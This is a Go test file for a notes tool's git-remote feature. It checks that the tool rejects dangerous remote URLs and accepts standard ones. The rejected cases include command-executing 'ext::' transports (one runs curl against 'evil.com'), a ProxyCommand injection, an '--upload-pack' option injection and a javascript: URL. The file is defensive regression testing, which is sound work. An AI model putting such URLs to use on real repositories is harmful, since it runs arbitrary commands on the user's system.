package usecase_test

import (
	"context"
	"errors"
	"testing"

	"github.com/serverkraken/flow/internal/kompendium/testutil"
	"github.com/serverkraken/flow/internal/kompendium/usecase"
)

// TestManageRemote_SetRejectsDangerousSchemes guards review finding S3:
// `git remote set-url` accepts `ext::<command>` and `ext::ssh <command>`
// transports, both of which execute arbitrary shell commands on the
// next fetch / push. Plus a few other unfamiliar shapes that suggest
// the user fat-fingered something rather than meant a real git URL.
func TestManageRemote_SetRejectsDangerousSchemes(t *testing.T) {
	t.Parallel()
	cases := []string{
		"ext::sh -c 'curl evil.com'",
		"ext::ssh -o ProxyCommand=evil",
		"--upload-pack=evil",
		"javascript:alert(1)",
		"/local/path/no/scheme",
		"plain-text-no-scheme",
		"u", // single-letter — pre-fix would silently reach git
	}
	for _, url := range cases {
		t.Run(url, func(t *testing.T) {
			t.Parallel()
			rem := &testutil.FakeNotebookRemote{}
			u := usecase.NewManageRemote(testutil.NewFakeNoteStore(), rem)

			_, err := u.Set(context.Background(), usecase.SetInput{URL: url})
			if !errors.Is(err, usecase.ErrRemoteURLScheme) {
				t.Fatalf("URL %q: got %v, want ErrRemoteURLScheme", url, err)
			}
			if rem.SetURL != "" {
				t.Errorf("SetRemote must not be called for rejected URL (saw %q)", rem.SetURL)
			}
		})
	}
}

// TestManageRemote_SetAcceptsStandardSchemes locks down the legitimate
// shapes so the safety filter doesn't drift into rejecting real git URLs.
func TestManageRemote_SetAcceptsStandardSchemes(t *testing.T) {
	t.Parallel()
	cases := []string{
		"https://github.com/foo/bar.git",
		"http://gitlab.example.com/foo/bar.git",
		"ssh://git@example.com:22/foo/bar.git",
		"git://example.com/foo.git",
		"file:///srv/git/notes.git",
		"git@github.com:foo/bar.git",
		"deploy@host.example:repos/notes.git",
	}
	for _, url := range cases {
		t.Run(url, func(t *testing.T) {
			t.Parallel()
			rem := &testutil.FakeNotebookRemote{}
			u := usecase.NewManageRemote(testutil.NewFakeNoteStore(), rem)

			out, err := u.Set(context.Background(), usecase.SetInput{URL: url})
			if err != nil {
				t.Fatalf("URL %q: %v", url, err)
			}
			if out.URL != url || rem.SetURL != url {
				t.Errorf("URL not propagated: out=%q remote=%q", out.URL, rem.SetURL)
			}
		})
	}
}
